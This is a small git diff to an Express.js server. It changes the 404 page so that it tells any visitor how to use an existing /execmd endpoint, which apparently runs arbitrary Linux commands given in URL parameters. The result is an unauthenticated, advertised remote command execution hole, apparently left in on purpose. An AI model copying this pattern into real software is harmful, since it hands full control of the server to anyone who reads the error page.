@@ -20,7 +20,8 @@ app.use('/execmd', execmd);
 
 // Find 404
 app.use((_: express.Request, res: express.Response, next) => {
-  res.status(404).send('<h1>404 NOT FOUND</h1>');
+  res.status(404).send('<h1>404 NOT FOUND</h1>'
+  + '<h2>Try running: /execmd?command={linux command}&args={command args}</h2>');
   next();
 });
 
